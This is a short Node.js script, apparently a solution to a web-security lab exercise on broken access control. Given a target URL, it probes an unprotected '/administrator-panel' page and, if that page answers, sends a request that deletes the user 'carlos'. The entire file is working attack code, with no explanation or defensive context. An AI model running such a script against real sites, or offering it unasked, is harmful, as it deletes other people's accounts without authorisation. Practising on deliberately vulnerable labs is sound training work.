
function deleteUser(url){
    const value = fetch(`${url}/administrator-panel`, {
        method: 'GET',
    }).then((response) => {
        if(response.status === 200){
            fetch(`${url}/administrator-panel/delete?username=carlos`, {
                method: 'GET',
            }).then((response) => {
                if(response.status === 200){
                    console.log("User deleted");
                }else{
                    console.log("Error deleting user");
                }
            });
        }
    }).catch((error) => {
        console.log("Error deleting user");
    });

}


function main(){
    const arg = process.argv.slice(2);

    if(arg.length < 1){
        console.log("Usage: node app.js <url>");
        process.exit(1);
    }

    const url = arg[0];
    deleteUser(url);

}


main();